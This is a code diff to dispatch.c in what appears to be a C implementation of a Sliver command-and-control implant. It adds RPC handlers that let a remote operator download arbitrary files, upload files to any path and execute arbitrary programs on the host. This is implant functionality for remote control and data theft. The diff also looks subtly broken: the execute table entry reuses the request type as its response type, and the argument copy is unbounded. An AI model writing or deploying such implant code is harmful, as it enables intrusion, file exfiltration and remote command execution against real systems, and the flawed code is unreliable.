@@ -1,6 +1,7 @@
 /* src/rpc/dispatch.c - handler table and the first slice of Sliver RPCs. */
 #include "sliver/rpc.h"
 
+#include <errno.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -225,6 +226,88 @@ int sliver_rpc_handle_env(const sliver_envelope_t *req, sliver_buf_t *out) {
   return rc;
 }
 
+/* --- Download ---------------------------------------------------------- */
+int sliver_rpc_handle_download(const sliver_envelope_t *req, sliver_buf_t *out) {
+  sliver_download_req_t dl;
+  sliver_buf_t chunk;
+  int64_t limit = SLIVER_DOWNLOAD_CHUNK;
+  int64_t stop = 0;
+  int exists;
+  int rc;
+
+  if (sliver_download_req_decode(req->data, req->data_len, &dl) != 0) {
+    return -1;
+  }
+  sliver_buf_init(&chunk);
+  exists = sliver_fs_exists(dl.path);
+  if (exists) {
+    if (dl.stop > dl.start && dl.stop - dl.start < limit) {
+      limit = dl.stop - dl.start;
+    }
+    (void)sliver_fs_read_chunk(dl.path, dl.start, limit, &chunk);
+    stop = dl.start + (int64_t)chunk.len;
+  } else {
+    stop = dl.start;
+  }
+  rc = sliver_download_encode(out, dl.path, exists, dl.start, stop, chunk.data, chunk.len, 0,
+                              exists ? NULL : "download: no such file");
+  sliver_buf_free(&chunk);
+  return rc;
+}
+
+/* --- Upload ------------------------------------------------------------ */
+int sliver_rpc_handle_upload(const sliver_envelope_t *req, sliver_buf_t *out) {
+  sliver_upload_req_t up;
+  char err[256];
+  int ok;
+
+  if (sliver_upload_req_decode(req->data, req->data_len, &up) != 0) {
+    return -1;
+  }
+  err[0] = '\0';
+  ok = sliver_fs_write_chunk(up.path, up.data, up.data_len, up.overwrite) == 0;
+  if (!ok) {
+    (void)snprintf(err, sizeof(err), "upload %s: write failed (errno %d, len %u)", up.path,
+                   errno, (unsigned)up.data_len);
+  }
+  return sliver_upload_encode(out, up.path, ok ? 1 : 0, ok ? 0 : 1, err);
+}
+
+/* --- Execute ----------------------------------------------------------- */
+int sliver_rpc_handle_execute(const sliver_envelope_t *req, sliver_buf_t *out) {
+  sliver_execute_req_t ex;
+  const char *argv[SLIVER_EXEC_MAX_ARGS];
+  sliver_buf_t stdout_buf;
+  sliver_buf_t stderr_buf;
+  uint32_t pid = 0;
+  uint32_t status = 0;
+  size_t i;
+  int rc;
+
+  if (sliver_execute_req_decode(req->data, req->data_len, &ex) != 0) {
+    return -1;
+  }
+  for (i = 0; i < ex.argc; ++i) {
+    argv[i] = ex.args[i];
+  }
+  sliver_buf_init(&stdout_buf);
+  sliver_buf_init(&stderr_buf);
+  if (sliver_proc_exec(ex.path, argv, ex.argc, ex.output, &stdout_buf, &stderr_buf, &pid,
+                       &status) != 0) {
+    sliver_buf_free(&stdout_buf);
+    sliver_buf_free(&stderr_buf);
+    return sliver_execute_encode(out, 1, NULL, 0, NULL, 0, 0,
+                                 "execute: cannot start process");
+  }
+  LOG_DEBUG("rpc: execute %s -> pid %u status %u (%u/%u bytes)", ex.path, pid, status,
+            (unsigned)stdout_buf.len, (unsigned)stderr_buf.len);
+  rc = sliver_execute_encode(out, status, stdout_buf.data, stdout_buf.len, stderr_buf.data,
+                             stderr_buf.len, pid, NULL);
+  sliver_buf_free(&stdout_buf);
+  sliver_buf_free(&stderr_buf);
+  return rc;
+}
+
 /* --- table ------------------------------------------------------------- */
 static const rpc_entry_t g_handlers[] = {
     {SLIVER_MSG_LS_REQ, SLIVER_MSG_LS, sliver_rpc_handle_ls},
@@ -235,6 +318,9 @@ static const rpc_entry_t g_handlers[] = {
     {SLIVER_MSG_PS_REQ, SLIVER_MSG_PS, sliver_rpc_handle_ps},
     {SLIVER_MSG_TERMINATE_REQ, SLIVER_MSG_TERMINATE, sliver_rpc_handle_terminate},
     {SLIVER_MSG_ENV_REQ, SLIVER_MSG_ENV, sliver_rpc_handle_env},
+    {SLIVER_MSG_DOWNLOAD_REQ, SLIVER_MSG_DOWNLOAD, sliver_rpc_handle_download},
+    {SLIVER_MSG_UPLOAD_REQ, SLIVER_MSG_UPLOAD, sliver_rpc_handle_upload},
+    {SLIVER_MSG_EXECUTE_REQ, SLIVER_MSG_EXECUTE_REQ, sliver_rpc_handle_execute},
 };
 
 void sliver_rpc_result_free(sliver_rpc_result_t *result) {
@@ -277,4 +363,6 @@ void sliver_rpc_dispatch(const sliver_envelope_t *req, sliver_rpc_result_t *resu
     return;
   }
 }
+
+
 
